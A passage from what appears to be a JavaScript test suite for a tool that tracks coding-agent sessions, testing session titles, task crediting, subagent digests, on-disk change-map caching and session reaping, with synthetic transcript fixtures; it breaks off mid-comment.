test('observe: a compaction summary can never become the session title (0.8.6)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'compactTitle';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // On a compacted session the injected summary is a synthesized USER turn that arrives before the
  // real prompt survives — it passes the '<'/'Caveat:' guards, so without an explicit exclusion it
  // becomes firstUserPrompt, and from there the session title and the session-picker label: every
  // surface renaming itself to "This session is being continued…".
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      JSON.stringify({ timestamp: new Date(500).toISOString(), type: 'user', isCompactSummary: true, message: { role: 'user', content: 'This session is being continued from a previous conversation that ran out of context. Summary: …' } }),
      JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', message: { role: 'user', content: 'Add retry logic to the uploader' } }),
      // A real assistant turn: this is what makes S the session this workspace RESOLVES to, whatever
      // the mtimes say — the stub-proofing added in 0.8.4.
      JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'On it.' }] } }),
    ].join('\n') + '\n'
  );
  const ins = core.transcriptInsights(cwd, S);
  assert.equal(ins.firstUserPrompt, 'Add retry logic to the uploader', 'the real prompt wins over the injected summary');

  // The BOUNDED title scan applies the same filters (0.8.8) — and the sidecar answers repeat calls.
  const tx = path.join(proj, S + '.jsonl');
  assert.equal(core.fastSessionTitle(tx, S), 'Add retry logic to the uploader', 'fastSessionTitle skips the injected summary too');
  assert.equal(core.fastSessionTitle(tx, S), 'Add retry logic to the uploader', 'sidecar-cached second call agrees');
  core.ensureStore(S); // a store makes it a listed session
  const meta = core.sessionMeta(cwd);
  const row = meta.sessions.find((r) => r.id === S);
  assert.ok(row, 'sessionMeta lists this workspace\'s session');
  assert.equal(row.title, 'Add retry logic to the uploader', 'rows carry the fast title');
  // Each row carries what the session DID, the way a fleet row does — from the log, never the blobs.
  assert.deepEqual(
    { edits: row.edits, pending: row.pending, files: row.files },
    { edits: 0, pending: 0, files: 0 },
    'a session that captured nothing reports zeros, not absent fields'
  );
  assert.ok(row.lastActiveMs > 0, 'recency comes from the transcript mtime');

  // Counts that are only ever asserted at zero are counts nobody checked. Capture real work, and the
  // row must report it — and must NOT keep reporting the old numbers once the log moves, which is the
  // whole risk of caching them in a sidecar keyed to the log's stamp.
  const f1 = path.join(cwd, 'up.ts');
  const f2 = path.join(cwd, 'retry.ts');
  fs.writeFileSync(f1, 'a\n');
  fs.writeFileSync(f2, 'b\n');
  const e1 = core.appendLog(S, { tool: 'Edit', file: f1, before: null, after: null, added: 3, removed: 0, status: 'pending', ts: 1200 });
  core.appendLog(S, { tool: 'Edit', file: f2, before: null, after: null, added: 1, removed: 1, status: 'pending', ts: 1300 });
  const withWork = core.sessionMeta(cwd).sessions.find((r) => r.id === S);
  assert.deepEqual(
    { edits: withWork.edits, pending: withWork.pending, files: withWork.files },
    { edits: 2, pending: 2, files: 2 },
    'the row reports the work the log holds'
  );
  // Accepting one edit changes only `pending` — and the sidecar is keyed to the log's stamp, so the
  // next listing has to see it rather than serve the counts it cached a moment ago.
  core.setStatus(S, e1.id, 'kept');
  const after = core.sessionMeta(cwd).sessions.find((r) => r.id === S);
  assert.deepEqual(
    { edits: after.edits, pending: after.pending, files: after.files },
    { edits: 2, pending: 1, files: 2 },
    'a status change invalidates the counts sidecar — the row follows the log'
  );

  // 0.8.8 — the two properties the Sessions tab and the picker are BUILT on: rows come back ordered by
  // conversation recency (newest first), and exactly the session this workspace resolves to is flagged
  // `current`. Both are invisible to a shape assertion, and both decide what the reader is looking at.
  const S2 = 'compactTitle2';
  fs.writeFileSync(
    path.join(proj, S2 + '.jsonl'),
    JSON.stringify({ timestamp: new Date(2000).toISOString(), type: 'user', message: { role: 'user', content: 'Rewrite the uploader tests' } }) + '\n'
  );
  core.ensureStore(S2);
  // Make S2's conversation the newer one, by a margin no filesystem timestamp granularity can blur.
  const older = new Date(Date.now() - 60_000);
  fs.utimesSync(path.join(proj, S + '.jsonl'), older, older);
  const m2 = core.sessionMeta(cwd);
  const ids = m2.sessions.map((r) => r.id);
  assert.ok(
    ids.indexOf(S2) < ids.indexOf(S),
    'ordered by CONVERSATION recency — the session written to most recently leads, whatever its store says'
  );
  const active = core.resolveSessionId(cwd);
  assert.equal(m2.active, active, 'the payload names the session this workspace resolves to');
  assert.deepEqual(
    m2.sessions.filter((r) => r.current).map((r) => r.id),
    active ? [active] : [],
    'exactly one row is flagged current — the live session, never a guess'
  );
  // Pull the two properties apart: make the RESOLVED session the OLDEST conversation, so a row flagged
  // `current` can no longer be explained by "it happens to sort first".
  const S3 = 'compactTitle3';
  fs.writeFileSync(
    path.join(proj, S3 + '.jsonl'),
    JSON.stringify({ timestamp: new Date(3000).toISOString(), type: 'user', message: { role: 'user', content: 'Third session' } }) + '\n'
  );
  core.ensureStore(S3);
  // Every mtime in this fixture is set EXPLICITLY, a minute apart. S3 used to take `new Date()` while
  // S2 kept whatever its write had just stamped — also "now" — so which of the two led was decided by
  // sub-millisecond ordering, and a fast filesystem put S2 first (observed on CI, node 20).
  const newest = new Date();
  fs.utimesSync(path.join(proj, S3 + '.jsonl'), newest, newest);
  const middle = new Date(Date.now() - 60_000);
  fs.utimesSync(path.join(proj, S2 + '.jsonl'), middle, middle);
  const older2 = new Date(Date.now() - 120_000);
  // S2 and S3 are command-only stubs (no assistant record), so resolution stays on S even though S3 is
  // the newest file — the two properties now disagree, which is the only way this assertion can fail.
  fs.utimesSync(path.join(proj, S + '.jsonl'), older2, older2);
  const m3 = core.sessionMeta(cwd);
  assert.equal(core.resolveSessionId(cwd), S, 'resolution follows the real conversation, not the newest stub');
  assert.deepEqual(
    m3.sessions.filter((r) => r.current).map((r) => r.id),
    [S],
    'current tracks the RESOLVED session — a row is not current merely for sorting first'
  );
  assert.equal(m3.sessions[0].id, S3, '…while the ordering still puts the newest conversation first');
  assert.notEqual(m3.sessions[0].id, S, 'the two properties are genuinely separated in this fixture');
});

test('prompts: the ask that WORKS a task is credited, not the one that planned it (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'taskCredit';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const ask = (ts, text) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: text } });
  const call = (ts, id, name, input) =>
    JSON.stringify({
      timestamp: new Date(ts).toISOString(), type: 'assistant',
      message: { role: 'assistant', id: 'm' + id, content: [{ type: 'tool_use', id, name, input }] },
    });
  // Prompt #1 only PLANS (TaskCreate). Prompt #2 does the work, and says so the only way the newer task
  // system can: TaskUpdate, which carries a display number and a status and no subject at all.
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      ask(1000, 'plan the work'),
      call(1100, 'tc1', 'TaskCreate', { subject: 'Wire the loader', description: 'stream it' }),
      // The runtime answers a TaskCreate with the number it assigned — that result is where a task's id
      // comes from, and without it an update can be anchored to nothing.
      JSON.stringify({
        timestamp: new Date(1150).toISOString(), type: 'user',
        message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tc1', content: 'Task #1 created' }] },
      }),
      ask(2000, 'now do it'),
      call(2100, 'tu1', 'TaskUpdate', { taskId: '1', status: 'in_progress' }),
      call(2200, 'tu2', 'TaskUpdate', { taskId: '1', status: 'completed' }),
    ].join('\n') + '\n'
  );
  const rs = core.sessionPrompts(cwd, S);
  assert.equal(rs.length, 2, 'two asks');
  assert.equal(rs[0].tasks, 0, 'writing a plan is not working a task — the planning ask is credited with none');
  assert.equal(rs[1].tasks, 1, 'the ask that moved the task is credited, though TaskUpdate names no subject');
});

test('prompts: a task count survives long titles, description-only edits, and later renames (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'taskEdges';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const ask = (ts, text) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: text } });
  const call = (ts, id, name, input) =>
    JSON.stringify({
      timestamp: new Date(ts).toISOString(), type: 'assistant',
      message: { role: 'assistant', id: 'm' + id, content: [{ type: 'tool_use', id, name, input }] },
    });
  const result = (ts, forId, text) =>
    JSON.stringify({
      timestamp: new Date(ts).toISOString(), type: 'user',
      message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: forId, content: text }] },
    });

  // A to-do whose text runs past the 160-character display clip. Its identity must come from the FULL
  // text, or it hashes to something no task equals — and the same item planned twice counts twice.
  const LONG =
    'Rewrite the uploader so that a partial multipart upload can resume from its last acknowledged ' +
    'chunk instead of restarting, including the retry budget and the backoff schedule it uses';
  assert.ok(LONG.length > 160, 'the fixture actually exceeds the display clip');

  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      ask(1000, 'plan and start the upload work'),
      call(1100, 'tc1', 'TaskCreate', { subject: LONG, description: 'resumable uploads' }),
      result(1150, 'tc1', 'Task #1 created'),
      // The same item, named again as a to-do — one task, whichever way it was planned.
      call(1200, 'tw1', 'TodoWrite', { todos: [{ content: LONG, status: 'in_progress' }] }),
      call(1300, 'tu1', 'TaskUpdate', { taskId: '1', status: 'in_progress' }),

      ask(2000, 'tidy the notes'),
      // A description-only edit: it moves nothing, so this ask worked no task.
      call(2100, 'tu2', 'TaskUpdate', { taskId: '1', description: 'note the backoff table' }),

      ask(3000, 'rename it and finish'),
      call(3100, 'tu3', 'TaskUpdate', { taskId: '1', subject: 'Resumable uploads' }),
      call(3200, 'tu4', 'TaskUpdate', { taskId: '1', status: 'completed' }),
    ].join('\n') + '\n'
  );

  const rs = core.sessionPrompts(cwd, S);
  assert.equal(rs.length, 3, 'three asks');
  assert.equal(
    rs[0].tasks,
    1,
    'the long item counts ONCE: identity comes from the full text, so the TaskCreate, the TodoWrite and ' +
      'the TaskUpdate all resolve to the same task'
  );
  assert.equal(rs[1].tasks, 0, 'an update that only edits a description is not work');
  assert.equal(rs[2].tasks, 1, 'the ask that renamed and finished it worked one task');

  // …and the rename does not reach back: the first ask is still credited with exactly one task, keyed
  // by the subject in force when it worked, not by the name the task has now.
  const again = core.sessionPrompts(cwd, S);
  assert.equal(again[0].tasks, 1, 'a later rename does not rewrite an earlier prompt\'s count');
  assert.deepEqual(
    again.map((r) => r.tasks),
    [1, 0, 1],
    'the whole session reads the same on a second pass'
  );
});

test('subagents: the digest is cached per transcript state, but the phase is asked every time (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'subDigest';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  const subs = path.join(proj, S, 'subagents');
  fs.mkdirSync(subs, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', message: { role: 'user', content: 'write the tests' } }) + '\n'
  );
  const agent = path.join(subs, 'agent-a1.jsonl');
  // The agent's turn is COMPLETE (its last message calls no tool), so its phase is decided by how long
  // ago the file was written — the part of the phase that a cache would freeze. A transcript ending on
  // an unanswered tool_use would be structurally "working" whatever its age, and would prove nothing.
  fs.writeFileSync(
    agent,
    [
      JSON.stringify({ timestamp: new Date(Date.now() - 1000).toISOString(), type: 'assistant', isSidechain: true, message: { role: 'assistant', id: 'x1', content: [{ type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos: [{ content: 'write the tests', status: 'in_progress' }] } }] } }),
      JSON.stringify({ timestamp: new Date(Date.now() - 900).toISOString(), type: 'user', isSidechain: true, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'ok' }] } }),
      JSON.stringify({ timestamp: new Date(Date.now() - 800).toISOString(), type: 'assistant', isSidechain: true, message: { role: 'assistant', id: 'x2', content: [{ type: 'text', text: 'done' }] } }),
    ].join('\n') + '\n'
  );

  const live = core.subagentDigests(cwd, S);
  assert.equal(live.length, 1, 'the subagent is listed');
  assert.equal(live[0].currentTask, 'write the tests', 'its plan comes from the cached digest');

  // Is the identity half REALLY served from the sidecar? Put a value in the cache that the file cannot
  // produce, leaving the stamp alone, and see which one comes back. (Aging the file instead proves
  // nothing: mtime IS the stamp, so the whole digest recomputes and the assertion passes with the cache
  // removed. Rewriting the file in place is no better — the filesystem's mtime precision is not ours to
  // hold fixed.)
  const sidePath = path.join(core.rootDir(), 'session-meta', S + '.json');
  const side = JSON.parse(fs.readFileSync(sidePath, 'utf8'));
  assert.ok(Array.isArray(side.subagentDigests) && side.subagentDigests.length === 1, 'the digest was written to the sidecar');
  // The phase is deliberately NOT in there: it is derived from how long ago the agent last wrote, so a
  // remembered copy would report an agent that stopped hours ago as still going.
  for (const k of ['phase', 'phaseConfidence', 'running']) {
    assert.ok(!(k in side.subagentDigests[0]), `the sidecar holds no ${k} — liveness is asked of the file every time`);
  }
  side.subagentDigests[0].currentTask = 'served from the sidecar';
  fs.writeFileSync(sidePath, JSON.stringify(side));
  const cached = core.subagentDigests(cwd, S);
  assert.equal(cached[0].currentTask, 'served from the sidecar', 'the identity half is read from the sidecar, not re-parsed');
  assert.ok(cached[0].phase, '…while the phase is still derived on every call');

  // Aging the file moves the stamp, which rebuilds the identity half too — that is how a renamed task
  // or a new to-do reaches the panel at all — and moves the phase with it.
  const old = new Date(Date.now() - 12 * 60 * 60 * 1000);
  fs.utimesSync(agent, old, old);
  const later = core.subagentDigests(cwd, S);
  assert.equal(later.length, 1, 'still listed');
  assert.equal(later[0].currentTask, 'write the tests', 'a changed stamp rebuilds the identity half from the file');
  assert.notEqual(later[0].phase, live[0].phase, 'and the phase followed the file, not the cache');
});

test('changemap: the map is memoized on disk across processes, and invalidated by either input (0.8.8)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'mapCache';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = path.join(proj, S + '.jsonl');
  fs.writeFileSync(
    tx,
    [
      JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', message: { role: 'user', content: 'do the thing' } }),
      JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'ok' }] } }),
    ].join('\n') + '\n'
  );
  core.ensureStore(S);
  const f = path.join(cwd, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });

  const first = core.cachedChangeMap(cwd, S, { root: cwd, prompts: true });
  assert.equal(first.summary?.units, 1, 'the map is built');
  // The cache file is what a FRESH process would read; assert it exists and that a second call agrees.
  const cacheDir = path.join(core.rootDir(), 'changemap-cache');
  assert.ok(fs.existsSync(cacheDir) && fs.readdirSync(cacheDir).length > 0, 'a cache entry was written');
  assert.deepEqual(core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }), first, 'the cached map is the same map');

  // A new edit must invalidate it — a stale map is worse than a slow one.
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 2, removed: 0, status: 'pending', ts: 1300 });
  assert.equal(core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }).summary?.units, 2, 'the log changing rebuilds it');

  // …and so must a transcript that grew (new prompts, tasks, actions all live there).
  fs.appendFileSync(tx, JSON.stringify({ timestamp: new Date(2000).toISOString(), type: 'user', message: { role: 'user', content: 'and another thing' } }) + '\n');
  assert.equal(
    core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }).prompts.length,
    2,
    'the transcript changing rebuilds it too'
  );

  // …and so must the WORKSPACE FILE itself. The map reads each edited file off disk to detect its
  // classes and place each edit in the CURRENT text, so a file the user edits in their editor is a
  // third input — and one that moves neither the transcript nor the log. Without stamping it, the map
  // kept reporting class names for a version of the file that no longer existed.
  const cls = path.join(cwd, 'k.py');
  const v1 = 'class Alpha:\n    def go(self):\n        return 1\n';
  fs.writeFileSync(cls, v1);
  // Real blobs: class attribution places the edit's introduced lines in the CURRENT text, so a
  // record with no snapshots has nothing to place and would pass this test vacuously.
  core.appendLog(S, {
    tool: 'Edit',
    file: cls,
    beforeBlob: core.writeBlob(S, Buffer.from('class Alpha:\n    def go(self):\n        return 0\n')),
    afterBlob: core.writeBlob(S, Buffer.from(v1)),
    status: 'pending',
    ts: 1400,
  });
  const named = core.cachedChangeMap(cwd, S, { root: cwd, prompts: true });
  const clsOf = (m) => m.edits.find((e) => e.file === 'k.py')?.cls ?? null;
  assert.equal(clsOf(named), 'Alpha', 'the class is detected from the file on disk');
  fs.writeFileSync(cls, 'class Renamed:\n    def go(self):\n        return 1\n');
  assert.equal(clsOf(core.cachedChangeMap(cwd, S, { root: cwd, prompts: true })), 'Renamed', 'editing the workspace file rebuilds it');
});

/* The cache entry is rewritten via tmp+rename on every MISS and not touched at all on a hit, so the
   entry's inode is the instrument for "did this rebuild?" — an output assertion cannot tell the two
   apart when the correct answer is that nothing changed. `placements.json` is excluded: it is the edit
   tree's own memo (see below) and moves on its own schedule. */
function mapCacheInos(session) {
  const dir = path.join(core.rootDir(), 'changemap-cache', session);
  return fs
    .readdirSync(dir)
    .filter((n) => n.endsWith('.json') && n !== 'placements.json')
    .sort()
    .map((n) => `${n}:${fs.statSync(path.join(dir, n)).ino}`)
    .join(',');
}

test('changemap: a sibling session GROWING does not invalidate this session\'s map (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'mapSelf';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const rec = (ms, text) =>
    JSON.stringify({ timestamp: new Date(ms).toISOString(), type: 'user', message: { role: 'user', content: text } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), rec(1000, 'do the thing') + '\n');
  core.ensureStore(S);
  const f = path.join(cwd, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });

  const build = () => core.cachedChangeMap(cwd, S, { root: cwd, prompts: true });
  build();
  const before = mapCacheInos(S);

  // POSITIVE CONTROL, and it must come first: a NEW sibling appearing DOES have to rebuild, because
  // summary.fleet counts the sessions in the project dir. Without this, a stamp that returned a
  // constant would sail through the assertion below while measuring nothing at all.
  const sib = path.join(proj, 'sibling.jsonl');
  fs.writeFileSync(sib, rec(2000, 'a second session') + '\n');
  assert.equal(build().summary.fleet, 1, 'the new sibling is counted');
  const afterAdd = mapCacheInos(S);
  assert.notEqual(afterAdd, before, 'a sibling APPEARING rebuilds the map (positive control)');

  // The fix: that sibling growing must NOT. Its bytes are not an input to this session's map — only
  // the set of session ids is — and stamping them meant every session in a project invalidated every
  // other one's cache on each tick, which is what made an old session's Overview cost ~14 s a refresh.
  fs.appendFileSync(sib, rec(3000, 'and it keeps working') + '\n');
  assert.equal(build().summary.fleet, 1, 'the fleet count is unchanged');
  assert.equal(mapCacheInos(S), afterAdd, 'a sibling APPENDING is served from cache');

  // Removal is the other half of the id set, and it is what a reap does.
  fs.rmSync(sib);
  assert.equal(build().summary.fleet, 0, 'a sibling disappearing rebuilds the map too');
});

test('tree: edit placement is memoized on disk and survives the process (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'placeCache';
  const cwd = tmpWork();
  const py = path.join(cwd, 'm.py');
  const v1 = 'class Alpha:\n    def go(self):\n        return 1\n';
  fs.writeFileSync(py, v1);
  core.ensureStore(S);
  core.appendLog(S, {
    tool: 'Edit',
    file: py,
    beforeBlob: core.writeBlob(S, Buffer.from('class Alpha:\n    def go(self):\n        return 0\n')),
    afterBlob: core.writeBlob(S, Buffer.from(v1)),
    status: 'pending',
    ts: 1400,
  });

  // A FRESH process is the whole point — the in-process memo is what already worked, and the Overview
  // spawns a new CLI process on every refresh tick, so only a disk tier can help it.
  const CORE = path.resolve(__dirname, '../dist/index.js');
  const inChild = () =>
    JSON.parse(
      cp.execFileSync(
        process.execPath,
        ['-e', `process.stdout.write(JSON.stringify(require(${JSON.stringify(CORE)}).buildEditTree(${JSON.stringify(S)}, { root: ${JSON.stringify(cwd)} })))`],
        { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: 'utf8' }
      )
    );

  // Only the PLACEMENT is under test. The blob deletion below also strips lineDelta's added/removed
  // counts, which are a different derivation — comparing whole trees would fail for reasons that have
  // nothing to do with the memo.
  const placement = (t) => ({ cls: t.files[0].classes[0]?.name ?? null, loose: t.files[0].loose.length });

  const cold = inChild();
  const pFile = path.join(core.rootDir(), 'changemap-cache', S, 'placements.json');
  assert.ok(fs.existsSync(pFile), 'placements were persisted');
  assert.equal(Object.keys(JSON.parse(fs.readFileSync(pFile, 'utf8')).entries).length, 1, 'one entry per class-bearing file');
  assert.deepEqual(placement(cold), { cls: 'Alpha', loose: 0 }, 'the edit is placed inside the class');

  // Building TWICE IN ONE PROCESS is its own case, and the one a long-lived host actually hits: the
  // in-process memo outlives the per-call store, so the second build takes only the memo path. When that
  // path did not re-retain its keys, the store's pruning flush rewrote this file as {} — the disk tier
  // deleting itself on every refresh after the first. A child process per build never sees it, which is
  // why every assertion here passed while the cache was being wiped in the VS Code extension host.
  const entries = () => Object.keys(JSON.parse(fs.readFileSync(pFile, 'utf8')).entries).length;
  cp.execFileSync(
    process.execPath,
    ['-e', `const c=require(${JSON.stringify(CORE)});for(let i=0;i<3;i++)c.buildEditTree(${JSON.stringify(S)},{root:${JSON.stringify(cwd)}});`],
    { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: 'utf8' }
  );
  assert.equal(entries(), 1, 'three builds in one process keep the entry (the memo path still retains it)');

  // Deleting the BLOBS is the instrument: placement is computed from them, so a run that still answers
  // "Alpha" can only have read the disk tier. Nothing here is keyed by mtime, so this is exact.
  fs.rmSync(path.join(core.rootDir(), S, 'blobs'), { recursive: true, force: true });
  assert.deepEqual(placement(inChild()), { cls: 'Alpha', loose: 0 }, 'a fresh process places it identically, without the blobs');

  // POSITIVE CONTROL: without the memo AND without the blobs there is nothing to place from, so the
  // edit falls out of the class. If this still said "Alpha", the assertion above would prove nothing.
  fs.rmSync(pFile);
  assert.deepEqual(placement(inChild()), { cls: null, loose: 1 }, 'with neither blobs nor memo the placement is lost');

  // …and that unplaceable result must never be written back, or it would outlive the process as a
  // wrong answer keyed identically to the right one.
  assert.ok(!fs.existsSync(pFile), 'a placement computed from unreadable blobs is not persisted');
});

test('changemap: a RUNNING workflow\'s growing transcript invalidates the map (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'wfStamp';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', message: { role: 'user', content: 'run a workflow' } }) + '\n'
  );
  const wf = path.join(proj, S, 'subagents', 'workflows', 'wf_abc');
  fs.mkdirSync(wf, { recursive: true });
  const agent = path.join(wf, 'agent-1.jsonl');
  fs.writeFileSync(agent, JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'user', message: { role: 'user', content: 'go' } }) + '\n');
  core.ensureStore(S);
  const f = path.join(cwd, 'a.ts');
  fs.writeFileSync(f, 'one\n');
  core.appendLog(S, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });

  const build = () => core.cachedChangeMap(cwd, S, { root: cwd, prompts: true });
  build();
  const before = mapCacheInos(S);

  // The entries of subagents/workflows/ are wf_<id> DIRECTORIES, and a directory's mtime and size do
  // not move when a file inside it grows — so stamping that directory alone left a workflow that was
  // still running frozen at whatever its window was when its first agent appeared. Assert the premise
  // rather than trusting it: if this ever failed, the shallow stamp would have been sufficient.
  const dirBefore = fs.statSync(wf);
  fs.appendFileSync(agent, JSON.stringify({ timestamp: new Date(1300).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'working' }] } }) + '\n');
  const dirAfter = fs.statSync(wf);
  assert.equal(`${dirBefore.mtimeMs}:${dirBefore.size}`, `${dirAfter.mtimeMs}:${dirAfter.size}`, 'the wf_ directory itself did not move (premise)');

  build();
  assert.notEqual(mapCacheInos(S), before, 'the growing agent transcript rebuilds the map');
});

test('fleet: a conversation older than a week is folded, and never the one under review (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = tmpWork();
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true }); // plain .git → commonDir resolves → the fleet engages
  const proj = core.projectDir(ws);
  fs.mkdirSync(proj, { recursive: true });
  const NOW = 'liveSess';
  const OLD = 'oldSess';
  const seed = (id) => {
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(
      p,
      [
        JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd: ws, message: { role: 'user', content: 'work on ' + id } }),
        JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a-' + id, content: [{ type: 'text', text: 'ok' }] } }),
      ].join('\n') + '\n'
    );
    core.ensureStore(id);
    const f = path.join(ws, id + '.ts');
    fs.writeFileSync(f, 'one\n');
    core.appendLog(id, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status: 'pending', ts: 1200 });
    return p;
  };
  seed(NOW);
  const pOld = seed(OLD);
  const rowFor = (viewing, id) => core.overviewChangeMap(ws, viewing, { root: ws }).agents.find((a) => a.session === id);
  const state = (r) => ({ folded: r.folded, loaded: r.loaded });

  // POSITIVE CONTROL: while it is recent the sibling is built like any other. Without this, a fold
  // that simply always fired would satisfy every assertion below.
  assert.deepEqual(state(rowFor(NOW, OLD)), { folded: false, loaded: true }, 'a recent sibling is built');

  // Age its conversation past the fold window.
  const ago = (Date.now() - 30 * 86400000) / 1000;
  fs.utimesSync(pOld, ago, ago);
  assert.deepEqual(state(rowFor(NOW, OLD)), { folded: true, loaded: false }, 'a week-old sibling is folded and not rebuilt');

  // Folding declines to BUILD; it never hides an answer that is already on disk.
  core.siblingOverview(ws, OLD, { root: ws });
  assert.deepEqual(state(rowFor(NOW, OLD)), { folded: true, loaded: true }, 'a folded sibling still renders from a warm cache');

  // The one that matters for a pinned old session: whatever its age, the session being VIEWED is
  // never folded — the user selected it precisely to look at what it did.
  const own = rowFor(OLD, OLD);
  assert.equal(own.folded, false, 'the session under review is never folded, however old');
  assert.equal(own.summary.units, 1, '...and its own map is fully built');
});

test('clean: --completed reaps finished sessions and refuses every live one (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  // realpath: a child process started with cwd=<symlinked tmp> reports the RESOLVED path from
  // process.cwd(), and projectDir() mangles the path it is given — so the CLI would look under a
  // different project dir than the fixture wrote to and find nothing.
  const ws = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
  const proj = core.projectDir(ws);
  fs.mkdirSync(proj, { recursive: true });
  const HOUR = 3_600_000; // REAP_QUIET_MS is a DAY — this deletes edit history, so the clock is coarse
  // Each session is one refusal clause in reapableSessions, so a rail that stopped working shows up
  // here as a specific session going missing rather than as a vague count.
  const mk = (id, agoMs, status) => {
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(
      p,
      [
        JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', cwd: ws, message: { role: 'user', content: id } }),
        JSON.stringify({ timestamp: new Date(1100).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a-' + id, content: [{ type: 'text', text: 'ok' }] } }),
      ].join('\n') + '\n'
    );
    core.ensureStore(id);
    const f = path.join(ws, id + '.ts');
    fs.writeFileSync(f, 'one\n');
    core.appendLog(id, { tool: 'Edit', file: f, before: null, after: null, added: 1, removed: 0, status, ts: 1200 });
    const t = (Date.now() - agoMs) / 1000;
    fs.utimesSync(p, t, t); // CONVERSATION recency is transcript mtime
    return p;
  };
  const age = (id, agoMs) => {
    const t = (Date.now() - agoMs) / 1000;
    fs.utimesSync(path.join(proj, id + '.jsonl'), t, t);
  };
  // sCurrent is the NEWEST transcript (so resolveSessionId answers with it) but is itself well past the
  // quiet window — otherwise the quiet rail would cover for the not-current rail and neither would be
  // under test. Each survivor below is spared by exactly one clause.
  mk('sCurrent', 30 * HOUR, 'kept');
  mk('sDone', 48 * HOUR, 'kept'); // the one that should go
  mk('sPending', 48 * HOUR, 'pending'); // old and quiet, but still has review left
  mk('sStaged', 48 * HOUR, 'kept');
  fs.mkdirSync(path.join(core.rootDir(), 'sStaged', 'staging'), { recursive: true });
  fs.writeFileSync(path.join(core.rootDir(), 'sStaged', 'staging', 'x.json'), '{}'); // capture in flight

  assert.equal(core.resolveSessionId(ws), 'sCurrent', 'the fixture puts the live session where we think');
  assert.deepEqual(
    core.reapableSessions(ws).map((s) => s.id),
    ['sDone'],
    'only the finished, quiet, unstaged, non-current session is reapable'
  );

  // The quiet rail on its own: a finished, non-current session whose conversation stopped only moments
  // ago is NOT finished enough. sCurrent stays newest so it keeps answering as current.
  age('sCurrent', 1 * HOUR);
  age('sDone', 2 * HOUR);
  assert.deepEqual(core.reapableSessions(ws).map((s) => s.id), [], 'a session that just went quiet is not reaped');
  age('sDone', 48 * HOUR);
  assert.equal(core.reapableSessions(ws)[0].reason, 'finished', 'a fully reviewed session is reported as finished');

  // ABANDONED: unreviewed edits do NOT protect a session forever. Two days in, sPending is still under
